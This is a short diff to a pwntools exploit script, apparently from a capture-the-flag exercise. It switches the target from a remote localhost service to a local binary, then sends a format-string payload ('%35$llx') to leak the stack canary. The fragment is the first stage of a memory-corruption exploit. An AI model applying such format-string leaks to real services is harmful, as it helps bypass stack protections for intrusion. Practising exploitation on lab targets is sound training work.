@@ -1,7 +1,6 @@
 from pwn import *
 
-#io = process(["../src/main.out"])
-io = remote("localhost", 50014)
+io = process(["../main.out"])
 io.sendline(b"%35$llx")
 canary = io.recvuntil(b"00")
 
